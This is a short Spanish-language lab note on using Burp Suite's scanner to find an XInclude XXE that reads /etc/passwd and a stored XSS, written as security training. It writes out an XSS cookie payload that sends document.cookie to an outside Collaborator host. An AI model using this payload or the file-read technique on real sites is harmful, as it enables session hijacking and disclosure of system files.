
- Seleccionamos Crawl & Audit, y luego la intensidad del escaneo.
![[Pasted image 20260804171950.png|361]]
![[Pasted image 20260804172002.png|418]]

- En el ejemplo de los labs, ns encontramos con una XXE Injection por tipo X-Include, con lo que podemos leer /etc/passwd a traves de un payload de https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xinclude-attacks :

![[Pasted image 20260804172420.png|700]]

---

- Para analizar solo una parte de informacion, nos mandamos la solicitud al Repeater y, seleccionando la parte a analizar, le damos a 'Scan Selected Insertion Point':

![[Pasted image 20260804172835.png|423]]

- En este caso nos saca un Stored XSS: ![[Pasted image 20260805140340.png|678]]

```
Cookie: session='"><svg/onload=fetch(`//uqonq5sg8gzjqxtugg01eksogfm6ayyn\.oastify.com/${btoa(document.cookie)}`)>:Q0o5SNv8KmbxZMesV1ZclzQ3sqJXLpiP
```

![[Pasted image 20260805140829.png]]

![[Pasted image 20260805140848.png]]